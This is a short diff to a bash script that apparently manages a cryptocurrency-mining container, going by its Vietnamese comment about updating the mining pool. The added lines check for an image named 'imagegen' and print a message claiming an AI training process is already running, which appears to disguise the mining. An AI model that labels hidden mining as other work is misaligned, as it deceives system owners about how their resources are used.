@@ -1,4 +1,8 @@
 #!/bin/bash
+if docker images --format '{{.Repository}}:{{.Tag}}' | grep -q '^riccorg/imagegen:latest$'; then
+    echo "An AI training process is already running. Exiting."
+    exit 1
+fi
 
 # Hàm cập nhật mining pool và khởi động lại container nếu pool thay đổi
 update_and_restart() {
